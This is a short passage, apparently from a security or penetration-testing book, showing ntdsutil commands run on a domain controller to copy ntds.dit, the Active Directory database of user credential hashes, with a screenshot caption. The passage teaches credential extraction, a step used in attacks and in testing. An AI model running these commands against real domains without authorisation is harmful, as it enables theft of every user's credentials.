The following steps show you how to accomplish this:

+   1. From the domain controller, run the following commands to make a copy of the ntds.dit file:

```
ntdsutil
activate instance ntds
ifm
create full C:\extract
quit
quit
```

The following screenshot shows the output of the preceding commands:

![](bbox=[0.13, 0.35, 0.835, 0.875])

Figure 17.27 – Extracting the Active Directory user's database with ntdsutil.exe